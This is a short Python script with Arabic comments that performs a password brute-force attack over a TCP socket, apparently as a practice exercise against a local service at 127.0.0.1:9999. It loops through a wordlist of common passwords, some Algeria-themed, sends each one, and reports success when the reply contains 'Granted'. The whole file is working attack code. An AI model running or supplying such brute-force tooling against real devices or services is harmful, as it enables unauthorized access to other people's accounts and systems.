import socket

target = "127.0.0.1" # عنوان هاتفك
port = 9999
wordlist = ["123456", "admin", "password", "test", "wifi", "algeria", "algeria2024", "root"]

print(f"[*] Starting Brute Force Attack on {target}:{port}")

for word in wordlist:
    print(f"[*] Trying password: {word}")
    
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((target, port))
    
    # استقبال رسالة الترحيب
    s.recv(1024)
    # إرسال كلمة المرور
    s.send(word.encode())
    # استقبال الرد
    response = s.recv(1024).decode()
    
    if "Granted" in response:
        print(f"\n[+] SUCCESS! Password is: {word}")
        s.close()
        break
    else:
        print("[-] Failed.")
    s.close()
